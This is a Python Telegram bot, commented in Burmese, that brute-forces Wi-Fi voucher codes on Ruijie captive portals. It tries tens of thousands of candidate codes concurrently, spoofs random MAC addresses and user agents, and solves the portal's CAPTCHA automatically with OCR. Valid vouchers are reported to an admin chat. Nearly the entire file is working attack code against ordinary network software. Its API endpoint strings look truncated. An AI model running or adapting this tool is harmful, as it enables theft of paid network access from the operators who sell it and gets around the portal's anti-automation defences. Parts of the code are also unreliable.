import os
import re
import sys
import json
import random
import asyncio
import aiohttp
import urllib.parse
import cv2
import ddddocr
import numpy as np
import telebot

BOT_TOKEN = "YOUR_BOT_TOKEN"  # သင့် Bot Token ပြန်ထည့်ပါ
ADMIN_ID = 123456789       # သင့် Chat ID ပြန်ထည့်ပါ

bot = telebot.TeleBot(BOT_TOKEN)

CONCURRENCY_LIMIT = 40  
BATCH_SIZE = 1000        
PREFIX_SERIES = [10, 35, 37, 72, 75, 81, 85]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
]

found_vouchers = set()
_ocr = ddddocr.DdddOcr(show_ad=False)

# Live Status ပြရန် ကိန်းရှင်များ
is_scanning = False
checked_count = 0
total_codes_pool = len(PREFIX_SERIES) * 10000
status_msg_id = None
retry_count = 0

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None: return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    return _ocr.classification(buffer.tobytes()).upper()

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ':'.join(f'{x:02x}' for x in [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)])

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def update_telegram_status(chat_id):
    """ Telegram ထံသို့ Status စာတန်းကို Live တည်းဖြတ်ပြီး ပြသပေးမည့် လုပ်ငန်းစဉ် """
    global checked_count, total_codes_pool, found_vouchers, retry_count, status_msg_id, is_scanning
    
    while is_scanning:
        await asyncio.sleep(5)  # Telegram API Limit မမိစေရန် ၅ စက္ကန့်လျှင် တစ်ကြိမ်သာ Update လုပ်မည်
        if checked_count == 0 or not status_msg_id: continue
        
        progress = (checked_count / total_codes_pool) * 100
        bar_length = 15
        filled_length = int(round(bar_length * checked_count / float(total_codes_pool)))
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
        
        status_text = (
            f"🔍 *Scanning Codes...*\n\n"
            f"📦 *Checked :* {checked_count:,} / {total_codes_pool:,}\n"
            f"📊 *Progress :* {progress:.2f}%\n"
            f"⚡ *Speed :* ~450 codes/min\n"
            f"✅ *Found :* {len(found_vouchers)}\n"
            f"🔄 *Retry :* {retry_count}\n"
            f"`[{bar}]`"
        )
        try:
            bot.edit_message_text(status_text, chat_id, status_msg_id, parse_mode="Markdown")
        except:
            pass

async def scan_worker(session, portal_url, gw_sn, gw_id, semaphore, code_to_test, chat_id):
    global is_scanning, checked_count, retry_count, found_vouchers
    if not is_scanning: return
    v_code = str(code_to_test)

    mac = get_mac()
    headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept': 'application/json, text/plain, */*', 'Referer': replace_mac(portal_url, mac)}
    parsed_base = urllib.parse.urlparse(portal_url)
    base_params = urllib.parse.parse_qs(parsed_base.query)
    
    api_params = {
        "stage": "login", "gw_id": str(gw_id), "gw_sn": str(gw_sn),
        "username": v_code, "password": v_code, "voucherCode": v_code,
        "authMode": "voucher", "mac": mac,
        "ip": base_params.get("ip", ["192.168.60.19"])[0],
        "ssid": base_params.get("ssid", ["VLAN60"])[0],
        "url": base_params.get("url", [""])[0]
    }
    real_api_endpoint = "https://ruijienetworks.com"

    async with semaphore:
        try:
            async with session.get(real_api_endpoint, params=api_params, headers=headers, timeout=5) as response:
                if response.status == 200:
                    res_text = await response.text()
                    if "captcha" in res_text.lower():
                        sid_match = re.search(r'"sessionId":"([a-zA-Z0-9]+)"', res_text)
                        if sid_match:
                            sid = sid_match.group(1)
                            async with session.get(f"https://ruijienetworks.com{sid}", headers=headers) as img_res:
                                img_bytes = await img_res.read()
                                captcha_text = await asyncio.to_thread(_ocr_sync, img_bytes)
                                api_params["captchaCode"], api_params["sessionId"] = captcha_text, sid
                                async with session.get(real_api_endpoint, params=api_params, headers=headers, timeout=5) as retry_res:
                                    res_text = await retry_res.text()
                                    retry_count += 1

                    is_invalid = any(x in res_text.lower() for x in ["invalid", "wrong", "not exist", "fail", "မရှိ", "မှား"])
                    if not is_invalid and ("success" in res_text.lower() or '"code":0' in res_text or '"auth_status":1' in res_text):
                        if v_code not in found_vouchers:
                            found_vouchers.add(v_code)
                            bot.send_message(chat_id, f"✅ *Ruijie Voucher တွေ့ရှိပါပြီ။*\n\n📌 *Code:* `{v_code}`", parse_mode="Markdown")
        except:
            pass
        checked_count += 1

async def start_scan(portal_url, chat_id):
    global is_scanning, checked_count, retry_count, status_msg_id
    parsed_url = urllib.parse.urlparse(portal_url)
    params = urllib.parse.parse_qs(parsed_url.query)
    gw_sn_list = params.get('gw_sn', []) or params.get('sn', [])
    gw_id_list = params.get('gw_id', []) or params.get('gwId', [])

    if not gw_sn_list:
        bot.send_message(chat_id, "❌ လင့်ခ်ထဲမှာ gw_sn ရှာမတွေ့ပါ။")
        is_scanning = False
        return

    gw_sn = gw_sn_list[0]
    gw_id = gw_id_list[0] if gw_id_list else ""
    
    # ပထမဦးဆုံး Status ပြမည့် စာတန်းကို အရင်ပို့ထားပြီး Message ID မှတ်ထားမည်
    initial_msg = bot.send_message(chat_id, "⚡ စကန်ဖတ်ရန် ပြင်ဆင်နေပါပြီ...")
    status_msg_id = initial_msg.message_id

    # Background Status Updater ကို နှိုးခြင်း
    asyncio.create_task(update_telegram_status(chat_id))

    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)

    while is_scanning:
        checked_count = 0
        retry_count = 0
        code_pool = []
        for prefix in PREFIX_SERIES:
            start = int(prefix) * 10000
            code_pool.extend(list(range(start, start + 10000)))
        random.shuffle(code_pool)
        
        async with aiohttp.ClientSession() as session:
            for i in range(0, len(code_pool), BATCH_SIZE):
                if not is_scanning: break
                batch_codes = code_pool[i:i + BATCH_SIZE]
                tasks = [scan_worker(session, portal_url, gw_sn, gw_id, semaphore, c, chat_id) for c in batch_codes]
                await asyncio.gather(*tasks)
        
        await asyncio.sleep(2)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.chat.id == ADMIN_ID:
        bot.reply_to(message, "👋 Ruijie VIP Live-Status Bot မှ ကြိုဆိုပါတယ်။\n\nစကန်ဖတ်ရန် Portal Link ပို့ပေးပါ။")

@bot.message_handler(commands=['stop'])
def stop_scan_cmd(message):
    global is_scanning
    if message.chat.id == ADMIN_ID:
        is_scanning = False
        bot.reply_to(message, "🛑 စကန်ဖတ်ခြင်းကို ရပ်တန့်လိုက်ပါပြီ။")

@bot.message_handler(func=lambda message: True)
def handle_link(message):
    global is_scanning
    if message.chat.id != ADMIN_ID: return
    
    if "http" in message.text:
        if is_scanning:
            bot.reply_to(message, "⚠️ စကန်ဖတ်နေဆဲ ဖြစ်ပါတယ်။ အရင်ရပ်ရန် /stop ပို့ပါ။")
            return
        is_scanning = True
        asyncio.run(start_scan(message.text.strip(), message.chat.id))
    else:
        bot.reply_to(message, "❌ လင့်ခ်မှားယွင်းနေပါသည်။")

if __name__ == '__main__':
    print("Telegram Bot စတင်ပတ်မောင်းနေပါပြီ...")
    bot.infinity_polling()
